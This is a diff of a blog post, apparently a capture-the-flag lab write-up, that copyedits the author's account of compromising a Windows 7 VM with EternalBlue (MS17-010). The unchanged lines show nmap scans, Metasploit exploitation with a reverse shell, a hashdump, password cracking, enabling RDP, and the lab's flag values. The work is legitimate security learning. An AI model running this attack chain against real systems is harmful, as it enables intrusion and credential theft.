@@ -9,10 +9,10 @@ draft: false
 ---
 
 ## Introduction:
-After participating in the Disney Can-You-Hack-It CTF, I've been trying to spend more of my time studying security and offensive penetration testing. Primarily, I've been trying to balance both understanding how to effectively perform an attack with the awesome frameworks out their like metasploit, but also gain a better understanding of what this framework is doing under the hood. This post is meant to be the first of many as I attempt to practice documenting both the attack and my methodology.
+After participating in the Disney Can-You-Hack-It CTF, I've been trying to spend more of my time studying security and offensive penetration testing. My main goal is to balance understanding how to effectively perform an attack with the awesome frameworks out there like metasploit while gaining a better understanding of what this framework is doing under the hood. This post is the first of many that will follow me documenting both the attacks and my methodologies.
 
 ## Environment
-Both attacks take place in a flat network consisting of my attack host, a freshly-booted Kali Linux livecd, and the the target host, a freshly booted Windows VM that I knew contained 3 flags to capture. No other information is known about the host, what it's running or it's OS versioning, however I would be lying if I said I didn't assume that this would be an eternalblue attack based off the name.
+Both attacks take place in a flat network consisting of my attack host, which is a freshly-booted Kali Linux livecd, and the the target host, a freshly-booted Windows VM that I knew contained 3 flags to capture. No other information is known about the host, like what it's running or its OS version, but I would be lying if I said I didn't assume that this would be an eternalblue attack based off the name.
 
 ## Attacking Blue with Metasploit
 I started the attack by opening a tmux session and starting meterpreter with `msfdb run` to spin up a postgres instance for persisting scans and recon data.
@@ -61,9 +61,9 @@ msf5 > db_nmap -sV -sC -Pn 10.10.201.83
 [*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 140.63 seconds
 ```
 
-This initial scan tended to provide further evidence toward my beliefs that this was an eternalblue attack as it looked like the host was a Windows 7 Service Pack 1 machine with SMB available. In addition, this ended up leaking a potential username as the computer's name, which was worth keeping in mind as a potential administrative user going forward. Additionally this pointed out relaxed security setting in the smb service's configuration.
+This initial scan began to confirm my suspicions that this was an eternalblue attack since it looked like the host was a Windows 7 Service Pack 1 machine with SMB available. In addition, this ended up leaking a potential username as the computer's name, which was worth keeping in mind as a potential administrative user going forward. Additionally this pointed out relaxed security setting in the smb service's configuration.
 
-Give what I knew so far I decided to probe a little further into SMB with an enumaration using nmap's `smb-enum-shares` scripts.
+With the information I collected so far, I decided to probe a little further into SMB with an enumaration using nmap's `smb-enum-shares` scripts.
 
 ```
 msf5 > db_nmap --script smb-enum-shares  -p 445 10.10.201.83
@@ -88,7 +88,7 @@ msf5 > db_nmap --script smb-enum-shares  -p 445 10.10.201.83
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
 ```
 
-Again this pointed to anonymous read access on the IPC share, another pointer towards eternalblue being the vector. With this information, I decided I should kick off a quick vuln scan with `nmap` to see if it would infact identify eternalblue. Which it quickly did, as `ms17-010`.
+This indicated anonymous read access on the IPC share, another piece of evidence pointing to eternalblue as being the attack vector. With this information, I decided I should kick off a quick vuln scan with `nmap` to see if it would infact identify eternalblue. Which it quickly did, as `ms17-010`.
 
 ```
 msf5 > db_nmap --script vuln  -p 445 10.10.201.83
@@ -120,7 +120,7 @@ msf5 > db_nmap --script vuln  -p 445 10.10.201.83
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 15.51 seconds
 ```
 
-Given that I had a potential attack I decided to do a quick recap of the services on the host to make sure I didn't miss anything and saw that I'd overlooked RDP listening, which ended up being useful later in the attack.
+I now had a potential attack vector to explore, but I decided to do a quick recap of the services on the host to make sure I didn't miss anything. This was crucial because I had overlooked an open RDP port, which ended up being important later in the attack.
 
 ```
 msf5 > services 
@@ -141,7 +141,7 @@ host          port   proto  name           state  info
 ```
 
 ### Preparing an attack
-First step was seeing if there was any exploit available for `ms17-010`
+The first step was to check if there were any exploits available for `ms17-010`
 
 ```
 msf5 > search ms17-010
@@ -162,7 +162,7 @@ Matching Modules
 Interact with a module by name or index, for example use 5 or use exploit/windows/smb/smb_doublepulsar_rce
 ```
 
-Since it's a windows 7 host that's being attacked the second option in the list seemed like a perfect candidate. 
+Since previous scans pointed to the target OS being windows 7, the second option in the list seemed like a perfect candidate. 
 
 ```
 msf5 > use 2
@@ -200,7 +200,7 @@ Exploit target:
    0   Windows 7 and Server 2008 R2 (x64) All Service Packs
 ```
 
-I left the default payload as the staged reverse TCP shell and decided to kick off an attack to see if I could get a shell.
+I left the default payload as the staged reverse TCP shell, and kicked off an attack to see if I could get a shell.
 
 ```
 msf5 exploit(windows/smb/ms17_010_eternalblue) > run -j
@@ -245,7 +245,7 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-SUCCESS! And it left me with `NT AUTHORITY\SYSTEM` credentials. At this point the machine was mine, but I decided to make sure I had a stable foothold on the machine before proceeding with searching for the flags.
+SUCCESS! And it left me with `NT AUTHORITY\SYSTEM` credentials. At this point the machine was mine, but I had to make sure that I had a stable foothold on the machine before proceeding to search for flags.
 
 ### Foothold
 The first step was making sure my shell on the host was stable. So I checked my pid and looked to see if I could migrate it to something like the print spooler. 
@@ -283,9 +283,9 @@ Process List
 
 Luckily for me it already looked like it was in the injected in the spool service so there was no need to proceed with a migration.
 
-While I already knew where this host was running from deploying it, this `ps` output also reiterated that this host was an EC2 instance via the `ssm-agent`, `LiteAgent` and `Ec2Config` processes. While this could also be seen in the nmap scans via the reverse dns lookup, I thought it was still worth calling out.
+Even though I already knew where this host was running from deploying it, the ps output also established that this host was an EC2 instance via the `ssm-agent`, `LiteAgent` and `Ec2Config` processes. This could have also been observed in the nmap scans via the reverse dns lookup, but I thought it was worth calling out.
 
-This point was again reiterated a quick run of the `post/windows/gather/checkvm` module.
+Confirmed again with a quick run of the `post/windows/gather/checkvm` module.
 
 ```
 meterpreter > run post/windows/gather/checkvm 
@@ -294,7 +294,7 @@ meterpreter > run post/windows/gather/checkvm
 [+] This is a Xen Virtual Machine
 ```
 
-Finally I grabbed a sysinfo output to confirm a bunch of information that we had already assumed or knew. 
+Finally I grabbed a sysinfo output to confirm a bunch of information that I had already assumed or known. 
 
 ```
 meterpreter > sysinfo 
@@ -307,7 +307,7 @@ Logged On Users : 0
 Meterpreter     : x64/windows
 ```
 
-With all this information, I tried to grab a hashdump to pivot from this shell to a longer-lived user.
+With all this information, I attempted to grab a hashdump to pivot from this shell to a longer-lived user.
 
 ```
 meterpreter > hashdump 
@@ -333,7 +333,7 @@ Use the "--show --format=NT" options to display all of the cracked passwords rel
 Session completed
 ```
 
-With the Jon user's password in hand, I ran the `post/windows/manage/enable_rdp` module, while this was probably unnecessary due to having seen the port was available, and was quickly able to connect as the our Jon admin user.
+With the Jon user's password in hand, I ran the `post/windows/manage/enable_rdp` module and was quickly able to connect as the our Jon admin user.
 
 ```
 meterpreter > run post/windows/manage/enable_rdp 
@@ -354,11 +354,11 @@ With a new shell I was able to find each of the 3 flags in fairly standard locat
 - C:\Users\Jon\Documents\flag3.txt flag{admin_documents_can_be_valuable}
 
 ## Attacking Blue without Metasploit
-Now that the initial attack out of the way I decided to attempt the attack without the help of metasploit for sourcing, packing and executing the exploit. This also imposed the restriction of not having the meterpreter shell to rely on.
+Now that I had completed the initial attack, I wanted to retry it without the help of metasploit for sourcing, packing and executing the exploit. This imposed the restriction of not having the meterpreter shell to rely on.
 
-While I understood the attack and the host at this point I decided to still run through the motions of host enumeration. For the sake of brevity, I will not repeat some of the callouts of the findings unless there are differences from the first attack.
+Even though I now understood the attack and the host I decided to run through the motions of host enumeration again. For the sake of brevity, I'll avoid repeating some of the callouts unless there are differences with the first attack.
 
-I started with the same nmap scan with the only difference being that I now supplied `-oA $ATTACKTARGET` to output the results to the host with the target servers ip as a prefix. This was to make up for the limitation of not having the results automatically persisted in `msfdb`.
+I started with the same nmap scan, the only difference being that I instead supplied `-oA $ATTACKTARGET` to output the results to the host with the target server's ip as a prefix. This functioned to make up for not having the results automatically persisted in `msfdb`.
 
 ```
 root@kali:~/ctf/scans# export ATTACKTARGET=10.10.87.38
@@ -467,7 +467,7 @@ Host script results:
 Nmap done: 1 IP address (1 host up) scanned in 15.51 seconds
 ```
 
-And once again the scans lead to the same conclusion that the host is vulnerable to eternalblue. So the next step was to hop on google and [exploitdb](https://www.exploit-db.com) to start looking for an exploit. 
+Once agaiin, the scans lead to the same conclusion that the host is vulnerable to eternalblue. So the next step was to hop on google and [exploitdb](https://www.exploit-db.com) to start looking for an exploit. 
 
 
 ### Preparing the attack
